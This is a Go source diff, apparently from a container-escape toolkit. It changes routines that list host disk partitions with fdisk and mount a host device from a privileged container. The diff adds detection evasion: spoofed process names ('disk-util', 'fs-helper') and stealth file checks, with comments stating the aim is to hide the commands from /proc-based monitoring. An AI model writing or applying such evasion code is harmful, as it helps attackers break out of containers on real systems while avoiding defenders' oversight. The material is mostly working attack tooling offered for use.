@@ -25,7 +25,6 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"regexp"
 	"strings"
 
@@ -38,20 +37,30 @@ import (
 
 // add this to check if the container have device priv
 func CheckFdisk() {
-	_, err := exec.LookPath("fdisk")
-	if err != nil {
+	if !util.StealthFileExists("/usr/sbin/fdisk") && !util.StealthFileExists("/sbin/fdisk") {
 		log.Println("cannot run `fdisk` command on target os")
 		return
 	}
 
-	cmd := exec.Command("fdisk", "-l")
+	// Use StealthExec with argv[0] spoofing so child appears as
+	// "disk-util" in /proc/PID/cmdline rather than "fdisk -l".
+	fdiskPath := "/usr/sbin/fdisk"
+	if !util.StealthFileExists(fdiskPath) {
+		fdiskPath = "/sbin/fdisk"
+	}
+	cmd := util.StealthExecCommand(fdiskPath, util.StealthExecOptions{
+		Argv0:     "disk-util",
+		Comm:      "disk-util",
+		ExtraArgs: []string{"-l"},
+	})
 
 	var output bytes.Buffer
 	cmd.Stdout = &output
-	e := cmd.Run()
+	e := util.StealthExecStart(cmd, "disk-util")
 	if e != nil {
 		log.Fatal("run command error :" + e.Error())
 	}
+	_ = cmd.Wait()
 
 	pattern := regexp.MustCompile("(?i)\\n/[^\\n]*linux(\\n|$)")
 	params := pattern.FindAllStringSubmatch(output.String(), -1)
@@ -101,11 +110,20 @@ func MountToRandomTarget(device string) (error, string) {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: fmt.Sprintf("fail to create mount dir in:%s", mountDir)}, ""
 	}
 
-	cmd := exec.Command("mount", device, mountDir)
+	// Use StealthExec with argv[0] spoofing: "mount" → "fs-helper".
+	mountPath := "/usr/bin/mount"
+	if !util.StealthFileExists(mountPath) {
+		mountPath = "/bin/mount"
+	}
+	cmd := util.StealthExecCommand(mountPath, util.StealthExecOptions{
+		Argv0:     "fs-helper",
+		Comm:      "fs-helper",
+		ExtraArgs: []string{device, mountDir},
+	})
 
 	var output bytes.Buffer
 	cmd.Stdout = &output
-	e := cmd.Run()
+	e := util.StealthExecStart(cmd, "fs-helper")
 	if e != nil {
 		return &errors.CDKRuntimeError{Err: e, CustomMsg: "mount error. possible reason: target container is not privileged."}, ""
 	}
